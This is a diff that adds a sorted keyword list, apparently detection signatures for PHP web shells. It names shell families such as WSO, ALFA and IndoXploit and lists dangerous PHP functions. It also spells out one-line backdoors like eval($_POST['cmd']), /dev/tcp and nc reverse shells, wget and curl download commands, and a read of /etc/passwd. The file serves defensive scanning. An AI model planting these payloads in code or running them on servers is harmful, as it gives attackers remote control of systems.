@@ -1,0 +1,332 @@
+$password = "MF6SXb5sds5";
+#!/usr/bin/perl -I/usr/local/bandmin
+${"_POST"}['cmd']();
+${${"_REQUEST"}['_']}();
+&mode=upload'>Upload file</a></td>
+* Leaf PHP Mailer by [orvx.pw]
+- Leaf PHPMailer</title>
+-r--r--r--
+-rw-r--r--
+-rw-rw-r--
+-rwxr-xr-x
+-rwxrwxrwx
+.well-known/pki-validation/wp-signup
+.wp-cache
+0byt3m1n1
+0byte
+768776e296b6f286f2a72607e276b62666c6d286
+<!-- End Matomo Code -->
+=== bbPress ===
+>File manager<
+>Upload file:
+@assert($_GET['cmd']);
+@assert($_POST['x']);
+@eval($_REQUEST['cmd']);
+ABC Manager
+ALFA TEaM Shell - v3.0.2
+ALFA TEaM Shell - v4.1-Tesla
+Alpha
+Andela1C3
+AnonymousFox
+B Ge Team File Manager
+CCAEF Uploader
+CHips L Pro sangad
+Change Permissions
+Cpanel Reset Password
+D3xterR00t
+Dr HeX
+F0x
+File manager
+FilesMAn
+FilesMan
+FoxCyberSecurity
+FoxWSO
+FoxWSO v1.2
+H3NING_MAL4M
+H3X
+Haxgeno7"
+Html404
+IndoXploit
+JEMBOETS
+Jijle3
+Leafmail3
+Leviathan Hunter
+MARIJuANA
+Marijuana
+Mini Shell
+Mini Shell By Black_Shadow
+Mister Spy
+MisterSpyv7up
+Mr.Anderson
+Ninja Shell
+NullBrain
+PHP File Manager
+PHP Uploader
+PHP Uploader - By Phenix-TN & Mr.Anderson
+PHPSESSID
+Phenix-TN
+Priv8 Home Root Uploader by Mrcakil
+Psych0.WorM
+Raiz0WorM
+RevoLutioN Namesis
+RxR
+RxR HaCkEr
+Sh3ll
+Sh3ll By Anons79
+Shell Uploader
+TheAlmightyZeus
+Tryag
+Tryag File Manager
+United Bangladeshi Hackers
+Upload file :
+Uploader RxR HaCkEr
+Vuln!! patch it Now!
+WHY MINI SHELL
+WSO
+WSO 2.5
+WSO 2.6
+WSO 4.2.5
+WSO 5.0.0
+WSOX ENC
+WebRooT
+WebShellOrb
+Windows-1251
+X_Shell
+Yanz Webshell! - PRIV8 WEB SHELL ORB YANZ BYPASS!
+[LAMBO]
+[UNAME]:
+a57bze8931
+aDriv4
+admin403
+admin404
+adriv4
+alfa
+alfa-v4
+alfa123
+alpha
+anons79
+anonymousfox
+apache_get_modules
+array_map(
+assert($_POST['cmd']);
+assert($_REQUEST['cmd']);
+assert()
+assert(base64_decode
+assert(base64_decode(
+assert(base64_decode($_POST['code']));
+assert(base64_decode($_REQUEST['x']));
+assert(gzinflate(base64_decode($_POST['payload'])));
+b374k
+base64_decode
+base64_encode
+blacksec
+bypass
+byps
+c99
+call_user_func($_POST['func'], $_POST['param']);
+chmod(
+chown
+chr
+con7
+con7ext
+config
+config root man
+cong
+cot
+create_function
+create_function('', $_POST['cmd']);
+curl
+disable_functions
+docindex
+dragonforce
+drwxr-x---
+eval($_POST['cmd']);
+eval()
+eval(base64_decode
+eval(base64_decode($_POST['code']));
+eval(gzdecode(base64_decode($_POST['x'])));
+eval(gzinflate(base64_decode($_POST['payload'])));
+eval(gzuncompress(base64_decode($_POST['data'])));
+eval(gzuncompress(base64_decode($_POST['x'])));
+eval(htmlspecialchars_decode(
+eval(str_rot13(base64_decode($_POST['data'])));
+eval(strrev($_POST['cmd']));
+evil
+eviltwin
+exec
+exec("/bin/bash -c 'bash -i >& /dev/tcp/".$_POST['ip']."/".$_POST['port']." 0>&1'");
+exec("bash -i >& /dev/tcp/".$_POST['ip']."/".$_POST['port']." 0>&1");
+exec("id");
+exec("ls -la");
+exec("php -r 'system($_GET[\"cmd\"]);'");
+exec("python -c 'import pty; pty.spawn(\"/bin/bash\")'");
+exec("wget ".$_GET['url']." -O ".$_GET['save']);
+exec($_
+exec($_GET['cmd']);
+fclose
+feof
+fgetc
+fgets
+fierza
+file_get_contents
+file_put_contents
+filemanager
+fox
+foxwso
+foxx
+fread
+function
+gecko
+gel4y
+gelay
+ghostsec
+god4m
+gzdecode
+gzinflate
+gzuncompress
+gzuncompress(base64_decode
+haxor
+highlight_file
+hunter
+iCloud1337 private shell
+include
+include_once
+includes
+indosec
+indoxploit
+is_readable
+is_writable
+izocin
+jadow
+jindex
+js?get
+kct
+kct403
+litespeed
+load
+local
+lock360
+lol
+mari
+marijuana
+mb_send_mail
+min
+mini
+minipriv
+minishell
+move_uploaded_file
+move_uploaded_file(
+mrjn
+name="_upl" type="submit" id="_upl" value="Upload
+nc
+ncat
+netcat
+new-index
+ninja
+okokok
+old-index
+omest403
+open_basedir
+opendir
+ord
+pack
+parse_ini_file
+passthru
+passthru($
+passthru($_REQUEST['cmd']);
+payload
+pcntl_exec
+phpMyAdmin
+phpinfo()
+phpinfo?re@=vo@
+popen
+popen($_GET['cmd'], 'r');
+pref
+preg_replace
+preg_replace_callback
+priv
+priv8
+proc_close
+proc_get_status
+proc_open
+proc_open("/bin/sh", [0=>['pipe','r'], 1=>['pipe','w']], $pipes);
+proc_open($_POST['cmd'], [1=>['pipe','w']], $pipes);
+proc_terminate
+pwd
+qindex
+r00t
+radio?pass=shell
+rawurldecode
+require_once
+root
+root@indoxploit
+scandir
+shell
+shell20211028
+shell_exec
+shell_exec(
+shell_exec("cat /etc/passwd");
+shell_exec("nc -e /bin/sh ".$_POST['ip']." ".$_POST['port']);
+shell_exec($_POST['cmd']);
+shellbypass
+shells
+shl
+show_source
+shx
+socket_accept
+socket_bind
+socket_connect
+socket_create
+socket_listen
+socket_read
+socket_write
+str_rot13
+str_rot13(base64_decode
+stream_socket_client
+stream_socket_server
+strrev
+sunda
+sundaxploit
+sym403
+symlink
+symlink403
+sys
+system
+system("curl -O ".$_POST['url']);
+system("perl -e 'exec \"/bin/sh\";'");
+system("uname -a");
+system($
+system($_GET['cmd']);
+testwp?wp=1
+tinyfilemanager
+tonant
+touch
+trenggalek6etar
+ubhteam
+uk45
+un2?f=f
+uname -a
+unknown
+unlink
+unlink(__FILE__);?>
+unpack
+unserialize
+upload
+uploader
+vuln
+wp-wso
+wp_wrong_datlib
+wpindex
+wsanon
+wso
+wso2
+wso403
+wsopriv
+xAttacker
+xdmah
+xforce
+xichang1
+xleet
+xleet-shell
+xleetshell
+yanz
